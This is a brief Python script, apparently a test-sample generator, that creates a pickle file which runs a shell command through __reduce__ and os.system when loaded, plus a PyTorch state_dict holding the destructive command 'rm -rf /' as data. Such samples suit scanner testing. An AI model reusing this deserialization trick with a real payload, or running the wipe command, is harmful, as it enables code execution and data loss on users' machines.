import pickle
import torch
import numpy as np
import os
import sys

def create_malicious_pickle():
    """
    Tạo một file pickle độc hại với mã thực thi
    """
    class MaliciousClass:
        def __reduce__(self):
            cmd = 'echo "Malicious code executed" > malicious.txt'
            return os.system, (cmd,)
    
    with open('malicious_model.pkl', 'wb') as f:
        pickle.dump(MaliciousClass(), f)

def create_malicious_torch():
    """
    Tạo một mô hình PyTorch độc hại
    """
    class MaliciousTorchModel(torch.nn.Module):
        def __init__(self):
            super().__init__()
            self.linear = torch.nn.Linear(10, 1)
            
        def forward(self, x):
            return self.linear(x)
            
    model = MaliciousTorchModel()
    
    # Thêm mã độc vào state_dict
    state_dict = model.state_dict()
    state_dict['malicious'] = {'cmd': 'rm -rf /'}
    
    torch.save(state_dict, 'malicious_torch.pth')

if __name__ == '__main__':
    create_malicious_pickle()
    create_malicious_torch()
